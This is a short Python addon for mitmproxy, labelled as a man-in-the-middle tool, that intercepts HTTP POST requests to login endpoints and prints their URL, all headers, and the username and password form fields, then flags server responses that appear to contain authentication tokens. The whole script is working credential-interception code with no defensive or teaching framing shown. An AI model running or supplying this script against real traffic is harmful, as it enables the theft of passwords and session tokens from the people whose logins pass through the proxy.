from mitmproxy import http

def request(flow: http.HTTPFlow):
    """Intercept and log username & password from HTTP requests."""
    request = flow.request

    # Check if it's a POST request to the login endpoint
    if request.method == "POST" and "/login" in request.url:
        print("\n🔍 [MITM] Intercepted Login Request!")
        print(f"➡ URL: {request.url}")

        # Log headers
        print("➡ Headers:")
        for header, value in request.headers.items():
            print(f"  {header}: {value}")

        # Extract form data (credentials)
        if request.urlencoded_form:
            username = request.urlencoded_form.get("username", "N/A")
            password = request.urlencoded_form.get("password", "N/A")
            print(f"Username: {username} | Password: {password}")

def response(flow: http.HTTPFlow):
    """Log server responses."""
    response = flow.response
    print(f"\n🔍 [MITM] Intercepted Response: {response.status_code}")

    if "token" in response.text.lower():
        print("🚨 Possible authentication token found!")

